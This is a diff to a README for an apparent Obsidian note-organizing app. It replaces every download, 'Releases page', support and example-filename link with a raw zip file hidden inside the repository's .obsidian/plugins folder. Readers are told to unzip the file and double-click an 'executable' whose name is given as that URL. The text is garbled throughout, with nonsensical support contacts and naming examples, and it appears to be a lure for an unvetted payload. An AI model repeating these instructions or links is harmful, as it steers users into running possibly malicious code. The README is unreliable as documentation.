@@ -1,6 +1,6 @@
 # 🛠️ sample-obsidian-antigravity-1 - Organize Your Knowledge Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome to **sample-obsidian-antigravity-1**! This application helps you manage 
 
 ## 📥 Download & Install
 
-To download and install the application, visit the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip). 
+To download and install the application, visit the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip). 
 
 Look for the most recent version and click the download link. The file will be in a `.zip` format.
 
 Once the download completes, locate the file in your downloads folder. Unzip the file using built-in tools or software such as WinRAR or 7-Zip.
 
-Open the folder and find the executable file named `https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip`. Double-click this file to start the application.
+Open the folder and find the executable file named `https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip`. Double-click this file to start the application.
 
 ## 🛠️ System Requirements
 
@@ -35,7 +35,7 @@ Before downloading, ensure your system meets the following requirements:
 ### 01_Inbox/ 📥
 - This folder contains files organized from 00_Memo.
 - Each file is tagged and linked for easy navigation.
-- They follow a naming format based on the date (e.g., `https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip`).
+- They follow a naming format based on the date (e.g., `https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip`).
 
 ### 02_Daily/ 📅
 - Manage your daily notes in date-specific folders.
@@ -74,7 +74,7 @@ Currently, this application is designed for desktop use only.
 
 **2. How do I update the application?**
 
-To update, simply revisit the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip) and download the latest version. Follow the same installation steps.
+To update, simply revisit the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip) and download the latest version. Follow the same installation steps.
 
 **3. What should I do if I encounter an error?**
 
@@ -82,6 +82,6 @@ Check the Issues section on GitHub to see if others have reported similar proble
 
 ## 📞 Support
 
-For further assistance, you can raise issues via GitHub or contact support at [https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip).
+For further assistance, you can raise issues via GitHub or contact support at [https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip).
 
-Take the first step toward organized knowledge management. Download and install the app today by visiting the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/02_Daily/Monthly-Reviews/2025/sample-obsidian-antigravity-1_v2.9.zip).
+Take the first step toward organized knowledge management. Download and install the app today by visiting the [Releases page](https://raw.githubusercontent.com/randomuser3733/sample-obsidian-antigravity-1/main/.obsidian/plugins/obsidian-mind-map/antigravity-sample-obsidian-2.3.zip).
